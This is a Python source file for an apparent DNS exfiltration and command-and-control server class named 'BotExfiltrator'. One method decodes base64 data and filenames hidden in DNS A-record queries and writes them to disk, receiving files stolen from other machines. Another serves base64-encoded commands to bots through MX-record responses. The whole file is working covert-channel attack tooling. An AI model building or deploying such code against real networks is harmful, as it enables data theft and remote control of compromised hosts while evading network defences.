import base64
import os

from dns_exfil.exfiltrators.base.server import (
                                                InterceptDefaultResolver,
                                                CannotExfiltrateError
                                                )

class BotExfiltrator(InterceptDefaultResolver):
    def __init__(self):
        super().__init__()

    def A(self, name):
        '''
        This method is used to upload files to the server.
        Only the first two subdomains are important here.
        They represent the base64 encoded data and the filename
        <base64data> . <filneame> . any.domain.name.com
    
        Returns an IP based on the configuration file.
        '''
        try:
            fields = name.split('.')
            b64data = fields[0]
            filename = fields[1]
            decoded = base64.b64decode(b64data)
        except:
            raise CannotExfiltrateError
        with open(filename, 'a+b') as f:
            f.write(base64.b64decode(b64data))
        return self.context['ip']
       

    def MX(self, name):
        '''
        This method is used for downloading a 'command'
        which is sent down to the user in an MX record response.
        The command is stored in a file. This reads the last line of
        the file and returns the data in the first field of the domain name.
        '''
        filename = self.context['cmd']
        with open(filename) as f:
            line = f.readlines()[-1]
        encoded_command = base64.standard_b64encode(line.encode('utf-8'))
        return '.'.join([encoded_command.decode('utf-8'), name])

